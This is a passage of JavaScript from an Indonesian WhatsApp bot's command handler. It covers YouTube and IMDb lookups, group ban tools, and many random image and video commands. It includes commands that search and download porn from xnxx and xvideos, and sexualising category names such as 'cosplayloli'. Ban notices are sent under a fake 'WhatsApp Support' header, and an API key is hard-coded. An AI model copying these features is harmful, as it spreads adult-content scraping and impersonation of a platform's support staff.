let teks = '「🎥𝗬𝗢𝗨𝗧𝗨𝗕𝗘 𝗣𝗘𝗡𝗖𝗔𝗥𝗜𝗔𝗡🎥」\n\n🔎 '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks += `📌𝗡𝗼 : ${no++}\n📝𝗝𝘂𝗱𝘂𝗹 : ${i.title}\n📁𝗝𝗲𝗻𝗶𝘀 : ${i.type}\n🛡️𝗩𝗶𝗱𝗲𝗼 𝗜𝗗 : ${i.videoId}\n🗨️𝗧𝗮𝗺𝗽𝗶𝗹𝗮𝗻 : ${i.views}\n⏳𝗗𝘂𝗿𝗮𝘀𝗶 : ${i.timestamp}\n📤𝗗𝗶𝘂𝗻𝗴𝗴𝗮𝗵 : ${i.ago}\n📎𝗨𝗿𝗹 : ${i.url}\n\n─────────────────\n\n`
}
hinata.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },caption: teks }, { quoted: m })
}
break
//=================================================//
case 'ringtone': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} black rover`)
let { ringtone } = require('./HinataBase/lib/ringtone')
let anutone2 = await ringtone(text)
let result = anutone2[Math.floor(Math.random() * anutone2.length)]
hinata.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
}
break
//=================================================//
case 'xnxxsearch': case 'xnxxs': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
if (!text) return reply(`Masukkan Kata Pencarian`)
let res = await fg.xnxxSearch(text)
let ff = res.result.map((v, i) => `${i + 1}📝*Judul* : ${v.title}\n📎*Link:* ${v.link}\n`).join('\n')
if (res.status) reply(ff)
}break
//=================================================//
case 'xvideosearch': case 'xvideos': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
if (!text) return reply(`Masukkan Kata Pencarian`)
let res = await fg.xvideosSearch(text)
xvideotext = '✦✦「🔞 𝗫𝗩𝗜𝗗𝗘𝗢𝗦 𝗦𝗘𝗔𝗥𝗖𝗛 🔞」✦✦\n\n'
for (let i of res) {
xvideotext += `📍𝗝𝘂𝗱𝘂𝗹 : ${i.title}\n⏳𝗗𝘂𝗿𝗮𝘀𝗶 : ${i.duration}\n⏸️𝗟𝗶𝗻𝗸 : ${i.url}\n────────────────────\n`
}
hinata.sendMessage(from, { text: xvideotext.trim() }, 'extendedTextMessage', { quoted:m })
}break
//=================================================//
case 'xvideodl': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
if (!text) return reply(`Masukkan URL`)
if (!text.includes('xvideos.com')) return reply(`Masukkan tautan dari xvideo`)
let xv = await fg.xvideosdl(text)
hinata.sendMessage(m.chat, { caption: `✦「🔞 𝗫𝗩𝗜𝗗𝗘𝗢𝗦 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 🔞」✦

📍𝗝𝘂𝗱𝘂𝗹 : ${xv.result.title}
🎥𝗞𝗲𝘆𝘄𝗼𝗿𝗱 : ${xv.result.keyword}
🎞️𝗩𝗶𝗲𝘄 : ${xv.result.views}
🌟𝗩𝗼𝘁𝗲 : ${xv.result.vote}
👍𝗟𝗶𝗸𝗲 : ${xv.result.likes}
👎𝗗𝗲𝘀𝗹𝗶𝗸𝗲 : ${xv.result.deslikes}

01:43 ━━━━●───── 60:45
⇆ㅤ ㅤ◁ㅤ ❚❚ ㅤ▷ ㅤㅤ↻﻿
ılıılıılıılıılıılı
ᴠᴏʟᴜᴍᴇ : ▮▮▮▮▮▮
`, video: {url: xv.result.url} }, { quoted: m })
}
break
//=================================================//
case 'xnxxdl': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
if (!text) return reply(`Masukkan URL`)
if (!text.includes('xnxx.com')) return reply(`Masukkan tautan dari xnxx`)
let xn = await fg.xnxxdl(text)
hinata.sendMessage(m.chat, { caption: `✦「🔞 𝗫𝗡𝗫𝗫 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 🔞」✦

📍𝗝𝘂𝗱𝘂𝗹 : ${xn.result.title}
🎥𝗞𝘂𝗮𝗹𝗶𝘁𝗮𝘀 : ${xn.result.quality}
⏳𝗗𝘂𝗿𝗮𝘀𝗶 : ${xn.result.duration}
📑𝗜𝗻𝗳𝗼 : ${xn.result.info}
01:43 ━━━━●───── 60:45
⇆ㅤ ㅤ◁ㅤ ❚❚ ㅤ▷ ㅤㅤ↻﻿
ılıılıılıılıılıılı
ᴠᴏʟᴜᴍᴇ : ▮▮▮▮▮▮
`, video: {url: xn.result.files.high} }, { quoted: m })
}
break
//=================================================//
case 'ban': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
let help = `📄 Orang yang di ban tidak akan bisa menggunakan bot lagi

📌 Contoh : ${prefix+command} ${global.ownernumber}`
if (!args[0]) return reply(help)
bnnd = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknye = await hinata.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
banned.push(bnnd)
fs.writeFileSync('./HinataBase/database/banned.json', JSON.stringify(banned, null, 2))
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await hinata.groupParticipantsUpdate(from, [users], 'remove')
jongor = text.split("|")[0]+'@s.whatsapp.net'
reply(`Nomor ${bnnd} Telah Di Banned Dan Di Keluarkan dari Grup!!!`)
hinata.sendText(jongor, `\`\`\`「 WhatsApp Support 」\`\`\`\n\nHallo.. 👋\nAnda telah di banned oleh Bot dan di keluarkan dari Grup\n\nSilahkan hubungi owner kami untuk info lebih lanjut\n+${global.ownernumber}`, m, { detectLink: true })
}break
//=================================================//
case 'unban': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
let help = `📄 Orang yang di unban akan bisa menggunakan bot lagi

📌 Contoh : ${prefix+command} ${global.ownernumber}`
if (!args[0]) return reply(help)
yaki = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = banned.indexOf(yaki)
banned.splice(unp, 1)
fs.writeFileSync('./HinataBase/database/banned.json', JSON.stringify(banned, null, 2))
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await hinata.groupInviteCode(from)
reply(`Nomor ${yaki} Telah Di Unban!!!`)
hinata.sendText(bnnd, `\`\`\`「 WhatsApp Support 」\`\`\`\n\nHallo.. 👋\nSelamat anda telah di unban oleh Owner kami\n\nSilahkan masuk Grup kembali dan baca aturan serta larangan\n\nKetik *.larangan* untuk melihat daftar Kata terlarang, Agar tidak terbanned kembali \n\nLink Group : ${groupMetadata.subject}\nhttps://chat.whatsapp.com/${response}`, m, { detectLink: true })
}break
//=================================================//
case 'listban': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
teksooo = 'Daftar Pengguna Yang Di Ban\n\n'
for (let i of banned) {
teksooo += `- ${i}\n`
}
teksooo += `\n*Total : ${banned.length}*`
hinata.sendMessage(from, { text: teksooo.trim() }, 'extendedTextMessage', { quoted:m, contextInfo: { "mentionedJid": prem } })
}break
//=================================================
case 'runtime': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
let lowq = `🟢 ${runtime(process.uptime())}`
m.reply(lowq)
}break
//=================================================
case 'ping': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
◈ ━━━━━ Info Server ━━━━━ ◈

🚨 *Kecepatan*
${latensi.toFixed(4)} _Second_

⏲️ *Waktu Aktif*
${runtime(process.uptime())}

🖥️ *Ram*
${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

💾 *Penggunaan Memorry NodeJs*
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `💽 *Penggunaan Jumlah CPU*
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
reply(respon)
}break
//=================================================
case 'imdb': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`Beri nama Seri atau film`)
let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
let imdbt = ""
console.log(fids.data)
imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + "    ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
imdbt += "🎬𝗝𝘂𝗱𝘂𝗹: " + fids.data.Title + "\n"
imdbt += "📅𝗧𝗮𝗵𝘂𝗻 : " + fids.data.Year + "\n"
imdbt += "⭐𝗥𝗮𝗻𝘁𝗶𝗻𝗴: " + fids.data.Rated + "\n"
imdbt += "📆𝗥𝗶𝗹𝗶𝘀 : " + fids.data.Released + "\n"
imdbt += "⏳𝗗𝘂𝗿𝗮𝘀𝗶: " + fids.data.Runtime + "\n"
imdbt += "🌀𝗚𝗲𝗻𝗿𝗲: " + fids.data.Genre + "\n"
imdbt += "👨🏻‍💻𝗗𝗶𝗿𝗲𝗸𝘁𝘂𝗿 : " + fids.data.Director + "\n"
imdbt += "✍𝗣𝗲𝗻𝘂𝗹𝗶𝘀 : " + fids.data.Writer + "\n"
imdbt += "👨𝗔𝗸𝘁𝗼𝗿 : " + fids.data.Actors + "\n"
imdbt += "📃𝗣𝗹𝗼𝘁 : " + fids.data.Plot + "\n"
imdbt += "🌐𝗕𝗮𝗵𝗮𝘀𝗮 : " + fids.data.Language + "\n"
imdbt += "🌍𝗡𝗲𝗴𝗮𝗿𝗮: " + fids.data.Country + "\n"
imdbt += "🎖️𝗣𝗲𝗻𝗴𝗵𝗮𝗿𝗴𝗮𝗮𝗻 : " + fids.data.Awards + "\n"
imdbt += "📦𝗕𝗼𝘅𝗢𝗳𝗳𝗶𝗰𝗲: " + fids.data.BoxOffice + "\n"
imdbt += "🏙️𝗣𝗿𝗼𝗱𝘂𝗸𝘀𝗶 : " + fids.data.Production + "\n"
imdbt += "🌟𝗶𝗺𝗱𝗯𝗥𝗮𝘁𝗶𝗻𝗴 : " + fids.data.imdbRating + "\n"
imdbt += "✅𝗶𝗺𝗱𝗯𝗩𝗼𝘁𝗲𝘀: " + fids.data.imdbVotes + ""
hinata.sendMessage(m.chat, {
image: {
url: fids.data.Poster,
},
caption: imdbt,
}, {
quoted: m,
})
}break
//=================================================
case 'tiktokgirl': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var asupan = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
hinata.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
}break
//=================================================
case 'tiktokghea': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var gheayubi = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
hinata.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
}break
//=================================================
case 'tiktokbocil': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var bocil = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
hinata.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
}break
//=================================================
case 'tiktoknukhty': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var ukhty = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
hinata.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
}break
//=================================================
case 'tiktoksantuy': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var santuy = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
hinata.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
}break
//=================================================
case 'tiktokkayes': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var kayes = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
hinata.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
}break
//=================================================
case 'tiktokpanrika': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var rikagusriani = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
hinata.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
}break
//=================================================
case 'tiktoknotnot': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
hinata.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
}break
//=================================================
case 'china':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
}break
//=================================================
case 'hijab':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
}break
//=================================================
case 'indo':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
}break
//=================================================
case 'japanese':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
}break
//=================================================
case 'korean':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
}break
//=================================================
case 'malay':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
}break
//=================================================
case 'randomgirl':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
}break
//=================================================
case 'randomboy':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
}break
//=================================================
case 'thai':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
}break
//=================================================
case 'vietnamese':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
}break
case 'aesthetic':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
}break
//=================================================
case 'antiwork':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
}break
//=================================================
case 'bike':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/bike.json'))
var hasil = pickRandom(notnot)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
}break
//=================================================
case 'cat':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cat.json'))
var hasil = pickRandom(notnot)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
}break
//=================================================
case 'doggo':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/doggo.json'))
var hasil = pickRandom(notnot)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
}break
//=================================================
case 'kayes':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kayes.json'))
var hasil = pickRandom(notnot)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
}break
//=================================================
case 'notnot':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/notnot.json'))
var hasil = pickRandom(notnot)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
}break
//=================================================
case 'car':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/car.json'))
var hasil = pickRandom(notnot)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
}break
//=================================================
case 'ppcouple':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ppcouple.json'))
var hasil = pickRandom(notnot)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
}break
//=================================================
case 'profilepic':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/profile.json'))
var hasil = pickRandom(notnot)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
}break
//=================================================
case 'ulzzangboy':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
}break
//=================================================
case 'ulzzanggirl':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
}break
//=================================================//
case 'akira':
case 'akiyama':
case 'ana':
case 'art':
case 'asuna':
case 'ayuzawa':
case 'boneka':
case 'boruto':
case 'bts':
case 'cecan':
case 'chiho':
case 'chitoge':
case 'cogan':
case 'cosplay':
case 'cosplayloli':
case 'cosplaysagiri':
case 'cyber':
case 'deidara':
case 'doraemon':
case 'eba':
case 'elaina':
case 'emilia':
case 'erza':
case 'exo':
case 'femdom':
case 'freefire':
case 'gamewallpaper':
case 'glasses':
case 'gremory':
case 'hacker':
case 'hestia':
case 'husbu':
case 'inori':
case 'islamic':
case 'isuzu':
case 'itachi':
case 'itori':
case 'jennie':
case 'jiso':
case 'justina':
case 'kaga':
case 'kagura':
case 'kakasih':
case 'kaori':
case 'cartoon':
case 'shortquote':
case 'keneki':
case 'kotori':
case 'kpop':
case 'kucing':
case 'kurumi':
case 'lisa':
case 'madara':
case 'megumin':
case 'mikasa':
case 'mikey':
case 'miku':
case 'minato':
case 'mobile':
case 'motor':
case 'mountain':
case 'narutouzumaki':
case 'nekonime':
case 'nezuko':
case 'onepiece':
case 'pentol':
case 'pokemon':
case 'profil':
case 'progamming':
case 'pubg':
case 'randblackpink':
case 'randomnime':
case 'randomnime2':
case 'rize':
case 'rose':
case 'ryujin':
case 'sagiri':
case 'sakura':
case 'sasuke':
case 'satanic':
case 'shina':
case 'shinka':
case 'shinomiya':
case 'shizuka':
case 'shota':
case 'space':
case 'technology':
case 'tejina':
case 'toukachan':
case 'tsunade':
case 'wallhp':
case 'wallml':
case 'wallmlnime':
case 'yotsuba':
case 'yuki':
case 'yulibocil':
case 'yumeko': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
let heyy
try {
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/kurumi.json')
